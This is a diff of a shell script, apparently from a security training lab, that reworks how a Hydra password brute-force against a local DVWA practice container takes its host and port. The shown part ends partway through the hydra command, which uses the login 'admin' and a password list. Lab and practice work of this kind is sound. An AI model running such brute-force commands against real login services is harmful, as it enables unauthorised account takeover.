@@ -2,20 +2,17 @@
 #
 # denis-play-backend/plays/play-02-hydra-dvwa/run.sh
 
-# Vai para a pasta deste script
+# muda para o diretório do script
 cd "$(dirname "$0")"
 
-# Sem parâmetro, ataca sempre o serviço 'dvwa' na porta 80 da rede compose
-TARGET=${1:-dvwa:80}
+# host e porta padrão (serviço docker-compose)
+HOST=${1:-dvwa}
+PORT=${2:-80}
 
-echo "[*] Iniciando ataque com Hydra contra $TARGET..."
+echo "[*] Iniciando ataque com Hydra contra $HOST:$PORT..."
 sleep 1
 
-# Separa host e porta
-HOST=${TARGET%%:*}
-PORT=${TARGET#*:}
-
-# Executa Hydra no módulo correto (formulário HTTP POST) contra o DVWA
+# hydra espera primeiro o HOST (sem :porta) e -s porta separadamente
 hydra -l admin \
       -P passwords.txt \
       -s "$PORT" \
